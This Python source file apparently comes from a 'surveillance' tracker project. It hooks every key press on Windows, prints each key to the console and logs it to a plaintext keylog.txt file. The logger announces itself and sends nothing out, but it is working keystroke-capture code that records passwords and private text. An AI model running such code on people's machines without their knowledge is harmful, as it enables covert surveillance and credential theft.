import keyboard 
import logging
import os
import time
from datetime import datetime

from surveillance.src.trackers.message_dispatch import publish_keyboard_event

def win_monitor_keyboard(device_path=None, get_running_state=None):
    """
    Windows keyboard monitoring function.
    
    Args:
        device_path: Not used on Windows, but kept for API consistency
        get_running_state: Function that returns True if monitoring should continue, False to stop
    """
    # Set up logging
    logging.basicConfig(
        filename='keylog.txt',
        level=logging.INFO,
        format='%(asctime)s - %(message)s'
    )

    # Print welcome message
    print("Starting Windows keyboard logger...")

    def on_key_event(event):
        """Callback function for key press events"""
        # Skip key releases, only process key presses
        if event.event_type == 'down':
            # Log to console
            key_name = event.name
            publish_keyboard_event()
            if len(key_name) == 1:
                # For regular characters, show the character
                print(f"Key pressed: {key_name}, ASCII: {ord(key_name)}, Time: {datetime.now().strftime('%H:%M:%S')}")
            else:
                # For special keys
                print(f"Key pressed: {key_name}, Time: {datetime.now().strftime('%H:%M:%S')}")
            
            # Log to file
            logging.info(f"Key: {key_name}")

    # Register callback for all keys
    keyboard.hook(on_key_event)

    try:
        # Main loop - check external running state if provided
        while get_running_state is None or get_running_state():
            time.sleep(0.1)  # Sleep to prevent high CPU usage
    except KeyboardInterrupt:
        print("Interrupted by user")
    finally:
        # Clean up
        keyboard.unhook_all()
        print("Keyboard logging stopped.")
        print(f"Log file is located at: {os.path.abspath('keylog.txt')}")